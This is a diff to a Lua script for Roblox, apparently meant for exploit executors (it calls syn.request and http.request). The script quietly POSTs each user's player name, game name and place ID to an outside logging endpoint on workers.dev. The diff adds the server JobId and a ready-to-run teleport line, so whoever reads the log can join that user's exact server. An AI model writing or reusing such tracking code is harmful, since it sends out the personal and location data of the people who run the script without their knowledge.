@@ -14,28 +14,37 @@ local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 
 local player = Players.LocalPlayer
-local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+local success, gameInfo = pcall(function()
+    return MarketplaceService:GetProductInfo(game.PlaceId)
+end)
 
 local playername = player.Name
-local gamename = gameInfo.Name
+local gamename = success and gameInfo.Name or "Unknown Game"
 local gameid = game.PlaceId
+local jobId = game.JobId
 
 local _s = "https://log.xvchubontop.workers.dev/"
 
+local j = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobId .. "', game:GetService('Players').LocalPlayer)"
+
 local data = {
-	content = "Player: " .. playername .. " | Game: " .. gamename .. " | Game ID: " .. gameid
+    content = "Player: " .. playername ..
+              " | Game: " .. gamename ..
+              " | Game ID: " .. gameid ..
+              " | Server Join Script:\n```lua\n" ..
+              j .. "\n```"
 }
 
 local encoded = HttpService:JSONEncode(data)
 
 local req = (http and http.request) or (syn and syn.request) or (request)
 if req then
-	req({
-		Url = _s,
-		Method = "POST",
-		Headers = {
-			["Content-Type"] = "application/json"
-		},
-		Body = encoded
-	})
+    req({
+        Url = _s,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = encoded
+    })
 end
